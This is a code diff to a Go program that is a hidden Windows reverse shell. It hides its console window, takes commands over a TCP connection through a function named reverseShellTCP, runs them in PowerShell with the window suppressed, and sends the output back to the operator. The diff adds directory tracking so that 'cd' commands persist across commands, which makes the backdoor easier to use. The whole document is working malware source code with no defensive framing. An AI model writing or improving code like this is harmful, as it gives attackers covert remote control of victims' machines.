@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
 	"strings"
 	"syscall"
 	"sync"
@@ -23,6 +24,8 @@ var (
 	cleanupOnce    sync.Once
 	conn           net.Conn
 	connMutex      sync.RWMutex
+	currentDir     string // Track current directory
+	cdMutex        sync.RWMutex
 )
 
 func init() {
@@ -36,18 +39,22 @@ func init() {
 		const SW_HIDE = 0
 		showWindow.Call(hwnd, SW_HIDE)
 	}
+	
+	// Initialize current directory
+	cmd := exec.Command("cmd", "/C", "cd")
+	output, err := cmd.Output()
+	if err == nil {
+		currentDir = strings.TrimSpace(string(output))
+	} else {
+		currentDir = "C:\\"
+	}
 }
 
 // Get current directory for prompt
 func getCurrentDir() string {
-	cmd := exec.Command("powershell", "-Command", "pwd")
-	output, err := cmd.Output()
-	if err != nil {
-		return "PS C:\\> "
-	}
-	
-	dir := strings.TrimSpace(string(output))
-	return fmt.Sprintf("[+] pOwErShElL %s> ", dir)
+	cdMutex.RLock()
+	defer cdMutex.RUnlock()
+	return fmt.Sprintf("PS %s> ", currentDir)
 }
 
 // Cleanup function to close connection and terminate
@@ -70,6 +77,85 @@ func cleanup() {
 		// log.Println("Terminating process...")
 		os.Exit(0)
 	})
+}
+
+// Execute a command and handle cd specially
+func executeCommand(command string) string {
+	// Check if it's a cd command
+	trimmedCmd := strings.TrimSpace(command)
+	lowerCmd := strings.ToLower(trimmedCmd)
+	
+	// Handle cd command specially
+	if strings.HasPrefix(lowerCmd, "cd ") || lowerCmd == "cd" {
+		var newDir string
+		
+		if lowerCmd == "cd" {
+			// cd without arguments goes to home directory
+			cmd := exec.Command("powershell", "-Command", "[Environment]::GetFolderPath('UserProfile')")
+			output, err := cmd.Output()
+			if err != nil {
+				return fmt.Sprintf("cd: %v\n", err)
+			}
+			newDir = strings.TrimSpace(string(output))
+		} else {
+			// Extract the directory path from cd command
+			path := strings.TrimSpace(trimmedCmd[2:])
+			
+			// Handle special paths
+			if path == ".." {
+				// Go up one directory
+				cdMutex.RLock()
+				parent := filepath.Dir(currentDir)
+				cdMutex.RUnlock()
+				newDir = parent
+			} else if path == "." || path == "" {
+				// Stay in current directory
+				cdMutex.RLock()
+				newDir = currentDir
+				cdMutex.RUnlock()
+			} else {
+				// Convert to absolute path
+				cdMutex.RLock()
+				absPath, err := filepath.Abs(filepath.Join(currentDir, path))
+				cdMutex.RUnlock()
+				if err != nil {
+					return fmt.Sprintf("cd: %v\n", err)
+				}
+				newDir = absPath
+			}
+		}
+		
+		// Check if directory exists
+		if _, err := os.Stat(newDir); os.IsNotExist(err) {
+			return fmt.Sprintf("cd: Directory '%s' does not exist\n", newDir)
+		}
+		
+		// Update current directory
+		cdMutex.Lock()
+		currentDir = newDir
+		cdMutex.Unlock()
+		
+		return "" // Return empty string for cd command (no output)
+	}
+	
+	// For non-cd commands, execute in PowerShell with current directory
+	cmd := exec.Command("powershell", "-Command", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	
+	cdMutex.RLock()
+	cmd.Dir = currentDir // Set working directory
+	cdMutex.RUnlock()
+
+	var output bytes.Buffer
+	cmd.Stdout = &output
+	cmd.Stderr = &output
+	
+	err := cmd.Run()
+	if err != nil {
+		fmt.Fprintf(&output, "Command execution error: %v\n", err)
+	}
+	
+	return output.String()
 }
 
 // Reverse shell - single connection, no reconnection attempts
@@ -125,27 +211,19 @@ func reverseShellTCP(address string) error {
 				continue
 			}
 
-			// Execute command using PowerShell
-			cmd := exec.Command("powershell", "-Command", command)
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			// Execute command
+			output := executeCommand(command)
 
-			var output bytes.Buffer
-			cmd.Stdout = &output
-			cmd.Stderr = &output
-			
-			err = cmd.Run()
-			if err != nil {
-				fmt.Fprintf(&output, "Command execution error: %v\n", err)
-			}
-
-			// Send output
-			connMutex.RLock()
-			_, err = conn.Write([]byte(output.String()))
-			connMutex.RUnlock()
-			
-			if err != nil {
-				// log.Printf("Failed to send response: %v", err)
-				return fmt.Errorf("write error: %w", err)
+			// Send output (only if there is any)
+			if output != "" {
+				connMutex.RLock()
+				_, err = conn.Write([]byte(output))
+				connMutex.RUnlock()
+				
+				if err != nil {
+					// log.Printf("Failed to send response: %v", err)
+					return fmt.Errorf("write error: %w", err)
+				}
 			}
 		}
 	}
